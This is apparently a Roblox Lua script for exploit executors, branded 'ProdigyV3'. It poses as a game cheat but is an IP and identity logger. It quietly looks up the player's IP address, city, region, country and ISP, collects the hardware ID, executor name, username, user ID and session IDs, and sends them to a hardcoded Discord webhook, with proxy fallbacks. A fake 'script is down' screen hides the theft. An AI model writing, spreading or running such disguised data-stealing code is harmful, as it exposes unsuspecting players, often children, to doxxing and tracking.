local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1531434387760091257/Vvrua7K7E1TrWFRFKUSHTVqiiCRMgqNGe6H5zNUK-uxBsAAWx2-pUk1UVApQr34Dnz-A"

local req = (syn and syn.request) or request or (http and http.request)

if not req then
    warn("get an executor bro")
    return
end

if WEBHOOK_URL:find("1234567890") then
    warn("change the webhook url")
    return
end

local ipInfo = {ip = "?", city = "?", region = "?", country = "?", isp = "?"}
pcall(function()
    local res = req({Url = "http://ip-api.com/json/", Method = "GET"})
    if res and res.Body then
        ipInfo = HttpService:JSONDecode(res.Body)
    end
end)

local hwid = "?"
pcall(function()
    if syn and syn.gethwid then hwid = syn.gethwid() end
end)

local executor = "Unknown"
if syn then executor = "Synapse X"
elseif fluxus then executor = "Fluxus"
elseif krnl then executor = "KRNL"
elseif identifyexecutor then executor = identifyexecutor()
end

local userId = player.UserId
local username = player.Name
local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

local embed = {
    title = username .. " | ProdigyV3",
    color = 0xFF0000,
    thumbnail = {url = avatar},
    fields = {
        {name = "Username", value = username, inline = true},
        {name = "User ID", value = tostring(userId), inline = true},
        {name = "Account Age", value = player.AccountAge .. " days", inline = true},
        {name = "IP Address", value = ipInfo.query or "?", inline = true},
        {name = "City", value = ipInfo.city or "?", inline = true},
        {name = "State", value = ipInfo.regionName or ipInfo.region or "?", inline = true},
        {name = "Country", value = ipInfo.country or "?", inline = true},
        {name = "ISP", value = ipInfo.isp or "?", inline = true},
        {name = "HWID", value = hwid:sub(1, 30) .. "...", inline = true},
        {name = "Executor", value = executor, inline = true},
        {name = "Place ID", value = tostring(game.PlaceId), inline = true},
        {name = "Job ID", value = game.JobId:sub(1, 20), inline = true},
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local data = {
    username = "ProdigyV3 Logger",
    embeds = {embed}
}

local jsonData = HttpService:JSONEncode(data)

local success = false

pcall(function()
    local res = req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
    if res.StatusCode == 204 or res.StatusCode == 200 then
        success = true
    end
end)

if not success then
    local proxies = {
        "https://webhook.lewisakura.moe/" .. WEBHOOK_URL,
        "https://hooks.hyra.io/api/webhooks/" .. WEBHOOK_URL:match("webhooks/(.+)")
    }
    
    for _, proxy in ipairs(proxies) do
        pcall(function()
            local res = req({
                Url = proxy,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
            if res.StatusCode == 200 or res.StatusCode == 204 then
                success = true
            end
        end)
        if success then break end
    end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ProdigyStatus"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.Parent = screenGui

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0.2, 0)
statusLabel.Position = UDim2.new(0, 0, 0.4, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "script is down rn"
statusLabel.TextColor3 = Color3.new(1, 1, 1)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.GothamBold
statusLabel.Parent = blackFrame

task.wait(3)

local fadeOut = TweenService:Create(statusLabel, TweenInfo.new(0.8), {TextTransparency = 1})
fadeOut:Play()
fadeOut.Completed:Wait()

statusLabel.Text = "prodigyv3 join for more info"
statusLabel.TextTransparency = 1

local fadeIn = TweenService:Create(statusLabel, TweenInfo.new(0.8), {TextTransparency = 0})
fadeIn:Play()
fadeIn.Completed:Wait()

task.wait(4)

local destroyTween = TweenService:Create(blackFrame, TweenInfo.new(1), {BackgroundTransparency = 1})
local textDestroy = TweenService:Create(statusLabel, TweenInfo.new(1), {TextTransparency = 1})
destroyTween:Play()
textDestroy:Play()
destroyTween.Completed:Wait()

screenGui:Destroy()
